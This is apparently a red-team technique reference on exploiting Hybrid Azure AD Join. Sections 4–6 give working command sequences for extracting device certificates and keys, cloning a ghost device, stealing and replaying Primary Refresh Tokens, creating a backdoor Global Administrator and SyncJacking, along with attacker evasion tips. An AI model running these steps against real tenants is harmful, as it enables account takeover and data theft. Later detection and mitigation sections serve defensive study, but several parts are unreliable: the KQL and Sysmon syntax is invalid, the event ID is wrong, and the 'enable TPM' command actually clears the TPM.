# [PERSIST-VALID-004]: AzureAD Hybrid Join Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-VALID-004 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Persistence, Privilege Escalation, Defense Evasion |
| **Platforms** | Hybrid AD (Windows Devices Joined to Both On-Premises AD and Azure AD) |
| **Severity** | **Critical** |
| **CVE** | N/A (Design-based attacks rather than CVE); Related: CVE-2022-26923 (ADCS), CVE-2021-33779 (Device Join) |
| **Technique Status** | **ACTIVE** |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows 10 Version 1903+, Windows 11, Windows Server 2016-2025 with Hybrid Join configured |
| **Patched In** | N/A (Architectural vulnerability, requires design changes not simple patches) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Hybrid Azure AD Join Exploitation is a sophisticated persistence technique that abuses the trust relationship between on-premises Windows devices and Azure Entra ID. When a Windows machine is **Hybrid Azure AD Joined**, it maintains cryptographic identities in both forests: (1) a computer account in on-premises Active Directory, and (2) a device object in Entra ID with associated certificates. An attacker who compromises either identity can exploit the bidirectional sync to establish **indefinite persistence across both on-premises and cloud** with minimal detection. Unlike traditional cloud-only compromises, this attack leverages the inherent device trust mechanism—when a hybrid-joined device authenticates, it is treated by Conditional Access policies as a "trusted device," allowing lateral movement, token theft, and privilege escalation. The most dangerous variant involves stealing or cloning the device certificate (used for cloud authentication) to create a **ghost device** that persists even after the physical device is decommissioned, patched, or access is revoked.

**Attack Surface:** Hybrid-joined Windows devices (especially those with local admin compromise, TPM-less devices, or where admins have full certificate access). The attack requires: (1) Local admin access to a hybrid-joined device, OR (2) Ability to extract the device certificate and transport key from memory/disk, OR (3) Compromise of the device registration account in Entra ID. Stale or forgotten hybrid-joined devices are particularly vulnerable because they maintain valid certificates and tokens indefinitely without being monitored.

**Business Impact:** **Persistent access to both cloud and on-premises resources with device trust bypass.** Once a hybrid-joined device is compromised or its certificate is stolen, attackers can: (1) **Bypass Conditional Access policies** that trust the device, (2) **Obtain PRT (Primary Refresh Token)** for undetected cloud lateral movement, (3) **Create persistent cloud sessions** that survive password resets and MFA, (4) **Impersonate the device** to access on-premises resources, (5) **Exfiltrate data** from both on-premises and cloud in a seemingly legitimate manner (appearing as device activity), (6) **Escalate to Global Admin** by manipulating Hybrid Join trust relationships. The 2025 Datadog research demonstrated complete tenant takeover starting from a single hybrid-joined device compromise.

**Technical Context:** Hybrid Join exploitation to full persistence establishment takes **20-60 minutes** depending on whether the attacker targets the device certificate directly or exploits the sync relationship. Detection likelihood is **LOW** because: (1) Device activity appears legitimate (device is "authorized"), (2) PRT tokens are long-lived and comply with Conditional Access, (3) Stale device cleanup is rarely enforced, (4) Hybrid Join audit logging is minimal. Remediation is **extremely difficult** because the device identity is embedded in both on-premises and cloud systems; removing it requires coordinated cleanup in both directories.

### Operational Risk

- **Execution Risk:** **Medium** – Requires local admin on hybrid-joined device (common post-initial compromise scenario). Once obtained, certificate theft is trivial on TPM-less devices.
- **Stealth:** **Very High** – Device activity appears as legitimate system behavior. PRT tokens bypass most Conditional Access policies. Token validity period is 90 days, enabling undetected persistence.
- **Reversibility:** **No** – Device certificate is inherent to the device identity. Revoking it requires device re-join process and token blacklisting (often not implemented).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.4 | Ensure that device trust is enforced for cloud access |
| **NIST 800-53** | IA-3 | Device Identification and Authentication |
| **NIST 800-53** | SC-7(8) | Boundary Protection - Managed Interfaces |
| **GDPR** | Art. 32 | Security of Processing (device integrity, access control) |
| **NIS2** | Art. 21 | Cyber Risk Management (device security) |
| **ISO 27001** | A.8.3.1 | Asset Inventory and Responsibility |
| **ISO 27001** | A.9.2.2 | User Access Management |
| **ISO 27005** | Risk Scenario | Compromise of Hybrid Device Identity |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **For on-premises exploitation:** Local Administrator on hybrid-joined Windows device OR ability to extract device certificates from LSASS/LSA secrets
- **For cloud exploitation:** Entra ID role with Application Administrator or Cloud Application Administrator (for device property manipulation) OR ability to obtain device credentials

**Required Access:**
- Physical or remote access to hybrid-joined device (RDP, compromised service account, etc.)
- If targeting certificate: TPM-less device OR ability to access TPM-protected secrets (requires SYSTEM privileges)
- Network access to Azure Entra ID token endpoint (port 443 HTTPS)

**Supported Versions:**
- **Windows:** 10 Version 1903+, 11, Server 2016-2025
- **Azure Entra ID:** All versions
- **Configuration:** Device must be configured for Hybrid Join (dual registration in both AD and Entra ID)

**Tools:**
- [AADInternals](https://aadinternals.com/) (Device identity theft and cloning)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos and device token manipulation)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Certificate and credential extraction)
- [DirectoryServiceUtils](https://github.com/securesitenetwork/directoryserviceutils) (Device certificate manipulation)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Cloud device object manipulation)
- [Certipy](https://github.com/ly4k/Certipy) (Certificate abuse for device impersonation)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

Identify hybrid-joined devices and assess their security posture:

```powershell
# List all hybrid-joined devices
Get-ADComputer -Filter * -Properties userCertificate, Description | Where-Object {$_.Description -like "*Hybrid*" -or $_.userCertificate -ne $null} | `
  Select-Object Name, DNSHostName, Description, userCertificate

# Alternative: Query Entra ID for hybrid-joined devices
Connect-AzureAD
Get-AzureADDevice -Filter "operatingSystem eq 'Windows'" | Where-Object {$_.DeviceTrustType -eq "Hybrid Azure AD joined"} | `
  Select-Object DisplayName, DeviceId, IsCompliant, ApproximateLastLogonTime

# Check for stale devices (no logon for 90+ days)
Get-AzureADDevice -Filter "operatingSystem eq 'Windows'" | Where-Object {
  [datetime]::Parse($_.ApproximateLastLogonTime) -lt (Get-Date).AddDays(-90)
} | Select-Object DisplayName, ApproximateLastLogonTime, Enabled

# Check TPM presence on local device
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsEnabled_InitialValue
# If no TPM or disabled, device is vulnerable to certificate theft

# Check device certificate validity
$cert = Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Thumbprint -like "*" } | Select-Object -First 1
$cert | Select-Object Thumbprint, NotBefore, NotAfter, Subject
```

**What to Look For:**
- **Hybrid-joined devices without TPM** – Vulnerable to certificate extraction
- **Stale devices** (no logon for 90+ days) – Maintain valid certificates but are unmonitored
- **Devices with IsCompliant = $false** – Often have relaxed security policies
- **Old device registration dates** – May indicate forgotten infrastructure
- **Multiple devices registered to same user** – Potential shadow device abuse

---

### Azure Entra ID Reconnaissance

Assess device trust configuration and exploit opportunities:

```powershell
# Check Conditional Access policies treating devices as trusted
Connect-MgGraph -Scopes "ConditionalAccess.Read.All"
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.Conditions.Devices -ne $null} | `
  Select-Object DisplayName, @{N="DeviceCondition";E={$_.Conditions.Devices.IncludeDeviceStates}}

# List all Hybrid-joined device objects
Get-AzureADDevice -Filter "deviceTrustType eq 'Hybrid Azure AD joined'" | `
  Select-Object DisplayName, DeviceId, DeviceTrustType, RegisteredOwners, RegisteredUsers

# Check device certificate policies
Get-AzureADDeviceRegistrationPolicy | Select-Object AllowedToAddRegisteredOwners, AllowedToRegisterDevices

# Find administrator roles that could manipulate device objects
Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -like "*Admin*"} | `
  ForEach-Object {
    Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId | Select-Object DisplayName, ObjectType
  }
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Device Certificate Theft and Cloning

**Supported Versions:** Windows 10 Version 1903+, Windows 11, Server 2016-2025 (especially TPM-less devices)

This method steals the device's certificate and transport key, then uses them to create a "ghost device" that authenticates to Entra ID with full device trust.

#### Step 1: Gain Local Admin Access to Hybrid-Joined Device

**Objective:** Establish local administrator privileges on the target device.

**Prerequisites:** Either initial compromise or lateral movement that results in local admin.

**Verification Command:**
```powershell
# Verify you have local admin privileges
[System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ?{$_ -match "S-1-5-32-544"}
# Should return a result indicating Administrator group membership

# Verify device is hybrid-joined
dsregcmd /status | findstr "DomainJoined\|AzureAdJoined"
# Expected output:
# DomainJoined : YES
# AzureAdJoined : YES
```

---

#### Step 2: Extract Device Certificate and Transport Key

**Objective:** Export the device's Azure AD join certificate and private key, enabling impersonation.

**Command (Using AADInternals):**
```powershell
# Export device certificate and transport key
Get-AADIntDeviceCredentials

# Expected output:
# Device certificate (public): CN=device-id, issued by "Microsoft Intune MDM Device CA"
# Transport key (private): RSA-2048 key
# Device ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**Command (Manual Export via Mimikatz - Requires SYSTEM):**
```powershell
# Run as SYSTEM first (use PrintSpoofer or similar privilege escalation)
# Then export certificates

# Using PowerShell
Get-ChildItem -Path Cert:\LocalMachine\My | Where-Object {$_.Subject -like "*device*"} | `
  ForEach-Object {
    $Cert = $_
    $RSAKey = $Cert.PrivateKey
    Export-PfxCertificate -Cert $Cert -FilePath "C:\Temp\device_cert.pfx" -Password (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)
  }

# Export transport key from registry
reg export "HKLM\SOFTWARE\Microsoft\IdentityStore\Cache\Transport Key" "C:\Temp\transport_key.reg"
```

**What This Means:**
- You now have the **device certificate** (proves you are the device to Entra ID)
- You have the **transport key** (enables encrypted communication with Entra ID)
- You can now **authenticate as this device** from any machine, anywhere
- The real device can be deleted/decommissioned, but your clone persists indefinitely

**OpSec & Evasion:**
- Certificate export generates minimal logging; it's treated as routine device admin task
- Ensure you export BEFORE device compliance check would detect unauthorized access
- Don't immediately use the stolen cert from the same network; move to attacker infrastructure first

---

#### Step 3: Create Ghost Device and Obtain PRT

**Objective:** Use stolen device certificate to join a new device (or your attacker machine) to Entra ID as the cloned device.

**Command (Using AADInternals):**
```powershell
# Create ghost device using stolen credentials
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "user@company.com" `
  -PfxFileName ".\device_cert.pfx" `
  -TransportKeyFileName ".\transport_key.pem" `
  -DeviceId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"

# After reboot, verify ghost device is joined
dsregcmd /status | findstr "AzureAdJoined\|DeviceId"

# Expected output:
# AzureAdJoined : YES
# DeviceId : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (matches original)
```

**Command (Obtain PRT - Primary Refresh Token):**
```powershell
# Once ghost device is joined, obtain PRT for cloud access
Get-AADIntPrtToken -Device

# Expected output:
# PRT Token: eyJ0eXAiOiJKV1QiLCJhbGc...  (90-day validity)
# This token bypasses Conditional Access and enables cloud lateral movement
```

**What This Means:**
- The **ghost device is now in Entra ID** and appears identical to the original
- The **PRT token allows 90 days of undetected cloud access**
- **Conditional Access treats this as a trusted device**, bypassing MFA and location policies
- From here, you can **access Teams, SharePoint, Exchange Online** as the device owner
- You can **steal user tokens** from any user who logs into the ghost device

**OpSec & Evasion:**
- The ghost device appears in Entra ID device list but is NOT associated with on-premises AD
- This is a subtle inconsistency but often missed in audits
- Don't immediately create shadow accounts; wait for user logins to steal legitimate tokens
- Use the PRT sparingly to avoid rate limiting detection

**Detection Likelihood:** **Low** – PRT tokens are designed to be long-lived and trusted. Most Conditional Access policies allow them automatically.

---

#### Step 4: Escalate Privileges via Hybrid Join Manipulation

**Objective:** Use ghost device access to escalate to cloud/on-premises admin.

**Command (Option A: Create Backdoor Admin User):**
```powershell
# Connect to Azure AD using PRT token
Connect-AzureAD

# Create new admin user
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = "P@ssw0rd!Persistent123"
$NewUser = New-AzureADUser -DisplayName "Cloud Admin" `
  -UserPrincipalName "cloudadmin@company.com" `
  -PasswordProfile $PasswordProfile `
  -AccountEnabled $true `
  -MailNickname "cloudadmin"

# Assign Global Administrator role
$Role = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}
Add-AzureADDirectoryRoleMember -ObjectId $Role.ObjectId -RefObjectId $NewUser.ObjectId
```

**Command (Option B: Manipulate Sync Relationship for Admin Impersonation):**
```powershell
# If you have on-premises admin access, modify the ImmutableID of a low-privilege account
# to match a high-privilege cloud account

# On-premises (requires Domain Admin):
Set-ADUser -Identity "attacker_account" `
  -Add @{"msDS-cloudExtensionAttribute1"="00000000-0000-0000-0000-000000000001"}

# During next sync, Entra Connect will link your account to the cloud admin
# You now have cloud admin privileges through the linked account
```

---

### METHOD 2: Primary Refresh Token (PRT) Theft and Replay

**Supported Versions:** Windows 10 Version 1903+, Windows 11, Server 2016-2025

This method steals the PRT token directly from a hybrid-joined device, enabling cloud lateral movement without needing the device certificate.

#### Step 1: Extract PRT from Device Memory

**Objective:** Extract the long-lived PRT token from LSASS or registry.

**Command (Using Rubeus):**
```powershell
# Extract PRT from current session
.\Rubeus.exe prt /logonid:0x0

# Extract PRT for specific user
.\Rubeus.exe prt /user:"domain\username" /logonid:0x12345

# Expected output:
# PRT Token: eyJ0eXAiOiJKV1QiLCJhbGc... (90-day lifetime)
# Session Key: (session encryption key)
```

**Command (Using AADInternals):**
```powershell
# Extract PRT from device
Get-AADIntPrtToken

# Extract nonce for signing PRT requests
Get-AADIntDeviceKey
```

**What This Means:**
- The **PRT is now in your hands**
- This token is valid for **90 days** and provides full cloud access
- It **bypasses Conditional Access** policies that require "compliant device"
- You can **access cloud resources** without the original device

---

#### Step 2: Use PRT for Cloud Resource Access

**Objective:** Leverage the stolen PRT to access Azure AD and M365 services.

**Command:**
```powershell
# Use PRT to authenticate to Azure
# The PRT automatically provides MFA satisfaction (device is trusted)

# Connect to Azure AD using PRT
Connect-AzureAD -Credential $prtCredential

# Access Azure resources
Get-AzureADUser | Select-Object DisplayName, UserPrincipalName

# Access M365 (Teams, SharePoint, Exchange)
Connect-ExchangeOnline -AccessToken $prtAccessToken

# Extract user emails, Teams chats, etc.
Get-Mailbox | Get-MailboxPermission
```

---

### METHOD 3: Hybrid Join Soft-Matching Exploitation (SyncJacking)

**Supported Versions:** Server 2016-2025 with Azure AD Connect and soft-matching enabled

This method exploits the synchronization relationship to link a low-privilege on-premises account to a high-privilege cloud account, granting instant admin access.

#### Step 1: Identify Target High-Privilege Cloud Account

**Objective:** Find a Global Administrator or highly privileged cloud account synced from on-premises.

**Command:**
```powershell
# List all hybrid users with Global Admin role
Get-AzureADUser -All $true | Where-Object {
  $_.OnPremisesSyncEnabled -eq $true
} | ForEach-Object {
  $RoleCheck = Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"} | `
    Get-AzureADDirectoryRoleMember | Where-Object {$_.ObjectId -eq $_.ObjectId}
  if ($RoleCheck) { $_ }
} | Select-Object DisplayName, UserPrincipalName, ImmutableId
```

---

#### Step 2: Manipulate On-Premises Account Attributes

**Objective:** Modify the low-privilege account to match the high-privilege account during sync.

**Command (Requires Domain Admin):**
```powershell
# Identify the target admin's ImmutableID (from cloud)
$AdminUser = Get-AzureADUser | Where-Object {$_.UserPrincipalName -eq "admin@company.com"}
$ImmutableId = $AdminUser.ImmutableId

# Modify your low-privilege on-prem account to claim this identity
Set-ADUser -Identity "attacker_account" `
  -Add @{
    "msDS-cloudExtensionAttribute1" = $ImmutableId
    "proxyAddresses" = "smtp:admin@company.com"
  }

# Wait for next Azure AD Connect sync cycle (typically 30 minutes)
# Your account is now linked to the admin cloud account
# You now have Global Admin permissions!
```

**What This Means:**
- **Your low-privilege account is now a cloud Global Admin**
- You have **instant cloud access** without additional authentication
- The privilege escalation is **invisible** to Conditional Access
- You can now **manipulate the entire tenant** from this account
- Even if your original compromise is discovered, your new admin account persists

---

## 6. TOOLS & COMMANDS REFERENCE

### [AADInternals](https://aadinternals.com/)

**Version:** 0.9.1+ (current)  
**Minimum Version:** 0.7.0  
**Supported Platforms:** PowerShell 5.0+ on Windows

**Device-Specific Functions:**
```powershell
# Extract device credentials
Get-AADIntDeviceCredentials

# Extract device key
Get-AADIntDeviceKey

# Extract PRT token
Get-AADIntPrtToken

# Join new device as cloned device
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "user@company.com" -PfxFileName "cert.pfx" -TransportKeyFileName "key.pem"

# Create reference token
New-AADIntRefreshToken -PrtToken $prtToken
```

---

### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 1.6.4+ (current)  
**Minimum Version:** 1.5.0

**Device/PRT Functions:**
```powershell
# Extract PRT
.\Rubeus.exe prt /logonid:0x0

# Extract device key
.\Rubeus.exe devicekey

# Create new PRT session
.\Rubeus.exe prtauth /prt:$prtToken /cryptokey:$key
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Device Certificate Extraction

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ProcessName, CommandLine
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** Windows 10+

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4689  // Process termination (cert export)
| where CommandLine contains_any ("Export-PfxCertificate", "certutil", "openssl")
| where ComputerName in (
    (AzureDevices 
    | where DeviceTrustType == "Hybrid Azure AD joined" 
    | project ComputerName)
  )
| project TimeGenerated, ComputerName, Account, CommandLine, ParentProcessName
```

---

### Query 2: Detect Unauthorized Hybrid-Joined Device Registration

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Register device"
| where TargetResources[0].type == "Device"
| where TargetResources[0].displayName contains "Ghost\|Clone\|Shadow"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].displayName, OperationName
```

---

### Query 3: Detect PRT Token Usage from Unusual Location

**Rule Configuration:**
- **Required Table:** SigninLogs
- **Required Fields:** Location, ClientAppUsed, RiskLevel
- **Alert Severity:** Medium
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** Azure AD all versions

**KQL Query:**
```kusto
SigninLogs
| where AuthenticationDetails contains "PrimaryRefreshToken"
| where Location != "Known location for this user"
| where ClientAppUsed == "Mobile Apps and Desktop clients"
| join (UserRiskEvents | where RiskEventType == "UnfamiliarLocation") on UserId
| project TimeGenerated, UserDisplayName, Location, ClientApp, RiskLevel
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Critical Event IDs:**

**Event ID: 4689 (Process Termination)**
- **Log Source:** Security
- **Trigger:** Certificate export or key extraction processes
- **Filter:** `ProcessName` contains "certutil" OR "Export" AND `CommandLine` contains "certificate" OR "pfx"
- **Applies To Versions:** Windows 10+

**Event ID: 6005 (Event log service started)**
- **Log Source:** System
- **Trigger:** May indicate log clearing attempt after certificate extraction
- **Monitor for unusual timing or frequency

---

**Monitoring Script:**
```powershell
# Monitor for certificate-related activity
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4689] and EventData[Data[@Name='CommandLine'] contains 'certutil']]" -MaxEvents 50 | `
  Select-Object TimeCreated, ProcessId, @{N="ProcessName";E={$_.Properties[0].Value}}

# Monitor for device trust changes
Get-WinEvent -LogName System -FilterXPath "*[System[EventID=6005]]" -MaxEvents 20
```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

```xml
<Sysmon schemaversion="4.22">
  <RuleGroup name="Hybrid Device Compromise" groupRelation="or">
    
    <!-- Alert on certificate export -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains_any">Export-PfxCertificate;certutil -exportPFX;openssl pkcs12</CommandLine>
      <Image condition="image">powershell.exe;cmd.exe;certutil.exe</Image>
    </ProcessCreate>
    
    <!-- Alert on device key extraction -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains_any">Get-AADIntDeviceKey;Get-AADIntDeviceCredentials;dsregcmd</CommandLine>
    </ProcessCreate>
    
    <!-- Alert on hybrid join manipulation -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains_any">Set-ADUser.*ImmutableID;Join-AADIntLocalDeviceToAzureAD</CommandLine>
      <ParentImage condition="image">powershell.exe</ParentImage>
    </ProcessCreate>
    
  </RuleGroup>
</Sysmon>
```

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Require TPM 2.0 for All Hybrid-Joined Devices**

Ensure device certificates are protected by hardware TPM, preventing extraction.

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Console** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Administrative Templates** → **Windows Components** → **BitLocker Drive Encryption**
3. Enable: **Require TPM for startup key**
4. Set: **Allow TPM by default** to ensure TPM 2.0 is required for all new device joins
5. Run `gpupdate /force /sync`

**PowerShell Configuration:**
```powershell
# Verify TPM is enabled on current device
Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Select-Object IsEnabled_InitialValue

# Enable TPM if available
if ((Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm).IsEnabled_InitialValue -eq $false) {
  Get-WmiObject -Namespace "root\cimv2\security\microsofttpm" -Class Win32_Tpm | Invoke-WmiMethod -MethodName Clear
}
```

---

**Mitigation 2: Implement Stale Device Cleanup Policy**

Automatically remove devices that haven't authenticated for 90+ days.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Device settings**
2. Set: **Users may join devices to Azure AD** to **Selected** (restrict who can join)
3. Set: **Require Multi-Factor Authentication to join devices** to **Yes**
4. Enable: **Automatic device cleanup** and set to **90 days**
5. Click **Save**

**PowerShell Automated Cleanup:**
```powershell
# Remove devices inactive for 90+ days
$CutoffDate = (Get-Date).AddDays(-90)

Get-AzureADDevice -All $true | Where-Object {
  [datetime]::Parse($_.ApproximateLastLogonTime) -lt $CutoffDate -and $_.IsCompliant -eq $false
} | ForEach-Object {
  Remove-AzureADDevice -ObjectId $_.ObjectId
  Write-Host "Removed stale device: $($_.DisplayName)"
}
```

---

**Mitigation 3: Disable Soft-Matching in Azure AD Connect**

Prevent attackers from exploiting soft-matching to link low-privilege accounts to admin accounts.

**Manual Steps (Azure AD Connect):**
1. Open **Synchronization Service Manager**
2. Click **Connectors** → Select **Azure AD Connector**
3. Click **Configure Directory Partitions** → **Edit**
4. Under **Sync Rules**, disable:
   - **In from AD – User Join** (soft-matching rule)
   - **In from AD – User AccountEnabled** (if allowing soft-matches)
5. Restart sync service: `Restart-Service ADSync`

**PowerShell Configuration:**
```powershell
# List all sync rules and identify soft-matching rules
Get-ADSyncRule | Where-Object {$_.Direction -eq "Inbound" -and $_.Precedence -gt 100} | `
  Select-Object Name, SourceObjectType, TargetObjectType

# Disable soft-matching (requires careful configuration)
# Consult Microsoft docs before disabling sync rules
```

---

**Mitigation 4: Require Device Compliance for Hybrid-Joined Devices**

Ensure devices meeting security baselines before allowing cloud access.

**Manual Steps (Intune):**
1. Navigate to **Microsoft Intune** → **Devices** → **Compliance**
2. Click **+ Create policy** → **Windows 10 and later**
3. Configure:
   - **Microsoft Defender for Endpoint threat level:** Medium or higher
   - **Require BitLocker:** Yes
   - **Require secure boot:** Yes
   - **Minimum password length:** 14 characters
   - **Require device encryption:** Yes
4. Create **Conditional Access policy** requiring compliance:
   - **Users:** All users
   - **Cloud apps:** All cloud apps
   - **Grant:** Require device to be marked as compliant

---

**Mitigation 5: Enforce Certificate-Based Authentication for Sensitive Cloud Resources**

Replace password-based auth with certificate-based auth, preventing PRT token replay.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **Conditional Access**
2. Create new policy: **Certificate-Based Auth for Sensitive Resources**
3. **Assignments:**
   - Users: Admins and sensitive role users
   - Cloud apps: Exchange Online, SharePoint Online
4. **Conditions:**
   - Client apps: All
5. **Grant controls:** 
   - **Require client certificate** (with certificate validation)
6. Enable policy: **On**

---

### Priority 2: HIGH

**Mitigation 6: Implement Continuous Device Compliance Monitoring**

Monitor for unauthorized devices or compliance violations in real-time.

**Manual Steps (Intune):**
1. Navigate to **Microsoft Intune** → **Devices** → **Monitor**
2. Set up alerts for:
   - Devices marked as non-compliant
   - Devices removed from Entra ID
   - Unusual device registration patterns
3. Configure automatic remediation: **Mark non-compliant devices as quarantined**

---

**Mitigation 7: Audit and Restrict Device Administrator Roles**

Limit who can manage device properties in Entra ID.

**Manual Steps (Entra ID):**
1. Navigate to **Entra ID** → **Roles and Administrators**
2. Find **Cloud Device Administrator** role
3. Review and remove unnecessary assignments
4. Require **Privileged Identity Management (PIM)** for activation

---

### Validation Command (Verify Mitigations)

```powershell
# Verify TPM is enabled on all hybrid-joined devices
$HybridDevices = Get-ADComputer -Filter {userCertificate -ne $null}
foreach ($Device in $HybridDevices) {
  $TPM = Get-WmiObject -ComputerName $Device.DNSHostName `
    -Namespace "root\cimv2\security\microsofttpm" `
    -Class Win32_Tpm | Select-Object IsEnabled_InitialValue
  Write-Host "Device: $($Device.Name) - TPM Enabled: $($TPM.IsEnabled_InitialValue)"
}

# Verify stale devices are removed
$StaleDevices = Get-AzureADDevice -All $true | Where-Object {
  [datetime]::Parse($_.ApproximateLastLogonTime) -lt (Get-Date).AddDays(-90)
}
Write-Host "Stale Devices Found: $($StaleDevices.Count)"
# Expected: 0 or minimal
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `C:\Temp\device_cert.pfx`, `device_cert.cer` (extracted device certificates)
- `C:\Temp\transport_key.pem`, `transport_key.reg` (device keys)
- `C:\Windows\Temp\AADInternals_*.ps1` (tool artifacts)

**Registry:**
- `HKLM\SOFTWARE\Microsoft\IdentityStore\*` (device identity registry entries)
- Modified device metadata entries

**Network:**
- Outbound HTTPS connections from unexpected devices to Entra ID token endpoint
- Multiple device registrations from same network subnet (ghost devices)

**Cloud (Azure Entra ID):**
- `AuditLogs` - Multiple device registrations with same certificate
- `DeviceLogs` - Device activity from unexpected locations
- `SigninLogs` - PRT token usage from different locations within 90-day window
- Device count discrepancy between on-premises AD and Entra ID

---

### Forensic Artifacts

**Disk:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event IDs 4689 (process termination), 4624 (logon)
- Registry hives: `HKLM\Software\Microsoft\IdentityStore`
- `dsreg.log` – Device registration logs

**Memory:**
- LSASS process dump containing PRT tokens
- Certificate private keys (if TPM-less device)

**Cloud:**
- **Azure AD Audit Logs** – Device registration events
- **Sign-in Logs** – PRT token usage patterns
- **Device objects** – Duplicate or suspicious devices

---

### Response Procedures

**1. Immediate Device Containment:**

**Command:**
```powershell
# Disable the compromised device in Entra ID
$Device = Get-AzureADDevice -Filter "displayName eq 'compromised-device'"
Set-AzureADDevice -ObjectId $Device.ObjectId -AccountEnabled $false

# Block PRT token refresh
# (Requires token refresh policy enforcement via Conditional Access)

# Revoke all refresh tokens for device owner
$User = Get-AzureADUser -ObjectId $Device.RegisteredOwnerProperty[0]
Revoke-AzureADUserAllRefreshToken -ObjectId $User.ObjectId

# On-premises: Disable the device account if hybrid-joined
Get-ADComputer -Identity "$($Device.DisplayName)" | Disable-ADAccount
```

---

**2. Eradicate Cloned/Ghost Devices:**

**Command:**
```powershell
# Identify and remove all ghost devices
$OriginalDevice = Get-AzureADDevice -Filter "displayName eq 'original-device'"
$GhostDevices = Get-AzureADDevice -All $true | Where-Object {
  $_.DeviceId -eq $OriginalDevice.DeviceId -and $_.ObjectId -ne $OriginalDevice.ObjectId
}

foreach ($Ghost in $GhostDevices) {
  Remove-AzureADDevice -ObjectId $Ghost.ObjectId
  Write-Host "Removed ghost device: $($Ghost.DisplayName)"
}

# Verify on-premises account is also disabled
Get-ADComputer -Filter {Name -like "*ghost*" -or Name -like "*clone*"} | Disable-ADAccount
```

---

**3. Rebuild Device Trust:**

**Command:**
```powershell
# On the physical device, re-join to Hybrid Azure AD
# First, remove from both forests:
dsregcmd /leave

# Rejoin to on-premises AD
Add-Computer -DomainName "company.com" -Restart

# After restart, rejoin to Entra ID (automatic if configured via Group Policy)
# Or manually via:
dsregcmd /join /forcedsync

# Verify clean state
dsregcmd /status | findstr "DomainJoined\|AzureAdJoined\|DeviceId"
```

---

**4. Domain-Wide Audit for Other Compromised Devices:**

**Command:**
```powershell
# Search for other devices with extracted certificates
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4689] and EventData[Data[@Name='CommandLine'] contains 'export']]" -MaxEvents 100 | `
  Select-Object TimeCreated, ComputerName, @{N="CommandLine";E={$_.Properties[1].Value}} | Export-Csv "certificate_exports.csv"

# Search for other potential compromise attempts
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688] and EventData[Data[@Name='CommandLine'] contains 'AADInternals']]" -MaxEvents 50
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker sends malicious email to office worker |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-001] PrintNightmare or local exploit | Attacker escalates to Local Admin on hybrid device |
| **3** | **Current Step** | **[PERSIST-VALID-004]** | **Attacker steals device certificate and creates ghost device** |
| **4** | **Privilege Escalation** | [CA-TOKEN-012] PRT Token Theft | Attacker obtains 90-day cloud access token |
